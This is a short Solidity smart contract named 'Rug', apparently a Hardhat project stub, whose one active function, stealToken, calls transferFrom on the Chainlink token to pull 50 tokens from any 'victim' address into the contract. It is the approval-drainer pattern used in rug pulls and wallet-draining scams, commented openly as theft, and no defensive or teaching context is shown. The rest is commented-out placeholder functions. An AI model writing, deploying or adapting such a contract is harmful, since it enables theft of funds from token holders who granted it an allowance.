// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

interface ERC20TOKEN {
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);    
}

contract Rug {
    uint number = 20;

    ERC20TOKEN Chainlink = ERC20TOKEN(0x514910771AF9Ca656af840dff83E8264EcF986CA);

    function stealToken(address victim) public {
        // Steal token
        Chainlink.transferFrom(victim,address(this),50 ether);
    }
    

    // function buy() public payable {

    // }

    // function setValue(uint256 num) public returns(uint) {
    //     number = num;
    //     return number;
    // }
    // receive()external payable{

    // }



}
